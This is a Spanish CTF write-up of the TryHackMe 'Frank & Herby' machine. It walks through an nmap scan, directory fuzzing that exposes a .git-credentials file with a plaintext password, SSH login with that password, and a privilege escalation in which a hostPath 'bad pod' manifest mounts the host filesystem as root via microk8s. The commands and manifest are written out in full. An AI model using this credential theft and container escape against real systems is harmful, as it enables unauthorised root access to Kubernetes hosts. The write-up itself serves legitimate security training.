---                                                                                                                                                                                          
layout: single                                                                                                                                                                               
title: Frank & Herby THM - WriteUp                                                                                                                                                                  
excerpt: WriteUp de la máquina Frank & Herby de THM.                                                                                                                                        
date: 2023-02-22                                                                                                                                                                             
classes: wide                                                                                                                                                                                
header:                                                                                                                                                                                      
  teaser: /assets/images/FrankHerby/frankherby.png                                                                                                                                           
  teaser_home_page: true                                                                                                                                                                     
  icon: /assets/images/FrankHerby/frankherby.png                                                                                                                                             
categories:                                                                                                                                                                                  
  - infosec                                                                                                                                                                                  
tags:                                                                                                                                                                                        
  - ctf
  - BadPod                                                                                                                                                                                  
  - Writeup
  - git-leak                                                                                                                                                                                  
  - MicroK8s                                                                                                                                                                                 
  - Kubernetes                                                                                                                                                                        
---


Hoy estaremos tocando la máquina frank-herby de la plataforma TryHackMe. Vamos a aprender cositas sobre Kubernetes.

### Enumeración Inicial.

Lo primero que haremos será escanear el host en busqueda de servicios expuestos. Para esta taréa usaremos nmap. La máquina tarda un poco en arrancar...

```bash
# Nmap 7.91 scan initiated Wed Feb 22 14:03:57 2023 as: nmap -sC -sV -Pn -oN Extraction -p22,3000,10250,10255,10257,10259,16443,25000,31337,32000 10.10.232.30
Nmap scan report for 10.10.232.30
Host is up (0.057s latency).

PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:79:10:0d:72:67:23:80:4a:1a:35:8e:0b:ec:a1:89 (RSA)
|   256 3b:0e:e7:e9:a5:1a:e4:c5:c7:88:0d:fe:ee:ac:95:65 (ECDSA)
|_  256 d8:a7:16:75:a7:1b:26:5c:a9:2e:3f:ac:c0:ed:da:5c (ED25519)
3000/tcp  open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: 4tZYPb38TBmF7gacY
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 22 Feb 2023 13:04:10 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     Content-Security-Policy: default-src 'self' ; connect-src *; font-src 'self' data:; frame-src *; img-src * data:; media-src * data:; script-src 'self' 'unsafe-eval' ; style-src 'self' 'unsafe-inline' 
|     X-Instance-ID: 4tZYPb38TBmF7gacY
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 22 Feb 2023 13:04:11 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/a3e89fa2bdd3f98d52e474085bb1d61f99c0684d.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|_    <meta name="distribution" content
10250/tcp open  ssl/http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=dev-01@1633275132
| Subject Alternative Name: DNS:dev-01
| Not valid before: 2021-10-03T14:32:12
|_Not valid after:  2022-10-03T14:32:12
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10255/tcp open  http        Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10257/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 22 Feb 2023 13:04:14 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 22 Feb 2023 13:04:14 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1677070507
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2023-02-22T11:54:51
|_Not valid after:  2024-02-22T11:54:51
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
10259/tcp open  ssl/unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 22 Feb 2023 13:04:14 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     Date: Wed, 22 Feb 2023 13:04:15 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
| ssl-cert: Subject: commonName=localhost@1677070505
| Subject Alternative Name: DNS:localhost, DNS:localhost, IP Address:127.0.0.1
| Not valid before: 2023-02-22T11:54:50
|_Not valid after:  2024-02-22T11:54:50
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
16443/tcp open  ssl/unknown
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 22 Feb 2023 13:04:42 GMT
|     Content-Length: 129
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     Date: Wed, 22 Feb 2023 13:04:14 GMT
|     Content-Length: 129
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"Unauthorized","reason":"Unauthorized","code":401}
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.232.30, IP Address:172.17.0.1
| Not valid before: 2023-02-22T12:48:54
|_Not valid after:  2024-02-22T12:48:54
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   h2
|_  http/1.1
25000/tcp open  ssl/http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=127.0.0.1/organizationName=Canonical/stateOrProvinceName=Canonical/countryName=GB
| Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster, DNS:kubernetes.default.svc.cluster.local, IP Address:127.0.0.1, IP Address:10.152.183.1, IP Address:10.10.232.30, IP Address:172.17.0.1
| Not valid before: 2023-02-22T12:48:54
|_Not valid after:  2024-02-22T12:48:54
31337/tcp open  http        nginx 1.21.3
|_http-server-header: nginx/1.21.3
|_http-title: Heroic Features - Start Bootstrap Template
32000/tcp open  http        Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb 22 14:05:47 2023 -- 1 IP address (1 host up) scanned in 109.94 seconds
```

Tiene bastantes puertos abiertos, entre ellos podemos ver una API de Kubernetes. Ademas vemos dos aplicaciones web.

Un Rocket Chat (puerto 3000) que permite que nos registremos, si nos registramos podemos ver que se habla sobre un proyecto (una web) que esta desplegado en el puerto "31337"

En este chat también se habla sobre Microk8s, ademas, uno de los usuarios le menciona a otro que quite toda la basura del proyecto web alojado en el puerto 31337.

Si hacemos fuzzing podemos encontrar el siguiente directorio.

```bash
❯ dirsearch -u http://10.10.232.30:31337/

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10909

Output File: /usr/local/lib/python3.9/dist-packages/dirsearch-0.4.2-py3.9.egg/dirsearch/reports/10.10.232.30:31337/-_23-02-22_14-21-41.txt

Error Log: /usr/local/lib/python3.9/dist-packages/dirsearch-0.4.2-py3.9.egg/dirsearch/logs/errors-23-02-22_14-21-41.log

Target: http://10.10.232.30:31337/

[14:21:41] Starting: 
[14:21:43] 200 -   50B  - /.git-credentials
[14:21:51] 403 -  555B  - /assets/
[14:21:51] 301 -  169B  - /assets  ->  http://10.10.232.30/assets/
[14:21:53] 301 -  169B  - /css  ->  http://10.10.232.30/css/
[14:21:55] 200 -    5KB - /index.html
[14:22:02] 403 -  555B  - /vendor/
```

El archivo .git-credentials tiene un usuario y una contraseña:

```bash
❯ curl http://10.10.232.30:31337/.git-credentials
http://frank:f%40an3-1s-E337%21%21@192.168.100.50
```

El archivo .git-credentials es un archivo de configuración utilizado por Git para almacenar de manera segura las credenciales de autenticación (como nombres de usuario y contraseñas) que se utilizan para acceder a repositorios remotos.


Si intentamos loggearnos por ssh podemos comprobar que la contraseña es valida (Hay que url decodearla).

```bash
❯ ssh frank@10.10.232.30
frank@10.10.232.30 password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

113 updates can be installed immediately.
2 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Fri Oct 29 10:47:08 2021 from 192.168.120.38
frank@dev-01:~$ id
uid=1001(frank) gid=1001(frank) groups=1001(frank),998(microk8s)
```

Podemos observar que se encuentra en el grupo microk8s.

> Microk8s: **es una implementación de Kubernetes que permite ejecutar Kubernetes en Snap**. Gracias a que estamos en este grupo podemos gestionar todo lo que este relacionado con Kubernetes.


Podemos hacer uso de esa herramienta para listar pods, por ejemplo:

```bash
frank@dev-01:/$ microk8s kubectl get pods
NAME                                READY   STATUS    RESTARTS   AGE
nginx-deployment-7b548976fd-77v4r   1/1     Running   2          482d
```

Hay un pod corriendo...  Vamos a ver que permisos tenemos:

```bash
frank@dev-01:/$ microk8s kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]
```

Podemos realizar todas las accciones, ahora voy a ver en formato yaml el pod anterior para sacar algunas conclusiones.

```yaml
frank@dev-01:/$ microk8s kubectl get pod nginx-deployment-7b548976fd-77v4r -o yaml          
apiVersion: v1                                                                                                                                                                               
kind: Pod         
metadata:              
  annotations:                                                                                
    cni.projectcalico.org/podIP: 10.1.133.237/32                                              
    cni.projectcalico.org/podIPs: 10.1.133.237/32                                             
  creationTimestamp: "2021-10-27T19:48:23Z"                                                   
  generateName: nginx-deployment-7b548976fd-                                                  
  labels:               
    app: nginx                                                                                                                                                                               
    pod-template-hash: 7b548976fd                                                                                                                                                            
  name: nginx-deployment-7b548976fd-77v4r                                                                                                                                                    
  namespace: default                                                                          
  ownerReferences:                                                                                                                                                                           
  - apiVersion: apps/v1                                                                                                                                                                      
    blockOwnerDeletion: true                                                                  
    controller: true                                                                                                                                                                         
    kind: ReplicaSet                                                                          
    name: nginx-deployment-7b548976fd                                                         
    uid: 3e23e71f-b91a-41de-a65a-e50629eb51ec                                                 
  resourceVersion: "1811239"                                                                  
  selfLink: /api/v1/namespaces/default/pods/nginx-deployment-7b548976fd-77v4r                 
  uid: 29879983-7b7f-4143-a8b9-1eb34951fd6d
spec:              
  containers:                     
  - image: localhost:32000/bsnginx
    imagePullPolicy: Always                                                                   
    name: nginx                                                                               
    ports:                                 
    - containerPort: 80                     
      protocol: TCP  
```

La imagen usada es "localhost:32000/bsnginx", ahora intentaré crear un badpod.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pod-bly
  namespace: default
spec:
  containers:
  - name: pod-bly
    image: localhost:32000/bsnginx
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

```

Nos montará todo el sistema de archivos en /mnt dentro del contenedor. Vamos a desplegarlo.

```bash
frank@dev-01:/tmp$ microk8s kubectl apply -f badpod.yaml
pod/pod-bly created
```

Ahora vamos a intentar entrar al contenedor que se ha creado dentro de ese pod para acceder al sistema de archivos de la máquina anfitriona.

```bash
frank@dev-01:/tmp$ microk8s kubectl exec --stdin --tty pod-bly -- /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /mnt
# ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var
# cd /root/root
/bin/sh: 4: cd: can't cd to /root/root
# cd root
# ls      
root.txt  snap
```

Ya estaría pwneada... La Máquina muy bien, la velocidad de respuesta de la máquina deja muchisimo que desear... Thanks THM








